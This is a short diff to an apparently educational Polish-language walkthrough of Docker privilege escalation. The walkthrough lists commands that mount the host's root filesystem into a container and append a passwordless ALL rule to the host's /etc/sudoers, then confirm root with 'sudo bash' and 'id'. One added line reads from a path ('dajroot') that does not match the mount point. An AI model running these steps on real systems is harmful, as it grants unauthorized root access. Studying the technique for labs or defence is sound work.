@@ -33,10 +33,12 @@ Dockerfile:
 Tworzenie, uruchamianie obrazu, wykorzystanie luki i ponowna weryfikacja uprawnień
 
 ```bash
-docker ps # wyświetlenie listy uruchomionych aplikacji kontenerowych
 docker build -t folder . # tworzenie pliku obrazu folder
+docker ps # wyświetlenie listy uruchomionych aplikacji kontenerowych
 docker run -v /:/folder -it folder /bin/bash # uruchamianie obrazu (montowanie systemu plików do wskazanej lokalizacji kontenera oraz wybranie trybu internatywnego (opcja -i), opcji wykorzystania terminala (opcja -t), nazwy kontenera (tutaj folder) i powłoki OSa (tutaj /bin/bash) )
+cd ..
 echo "user ALL=(ALL) NOPASSWD:ALL" >> /folder/etc/sudoers # dodanie użytkownika do grupy sudoers (dopisanie do pliku /etc/sudoers hosta)
+cat dajroot/etc/sudoers # wyświetlenie pliku /etc/sudoers
 exit # zakończenie pracy z poziomu kontene
 sudo bash # wetyfikacja uprawnień
 id # sprawdzenie id aktualnie zalogowanego użytkownika
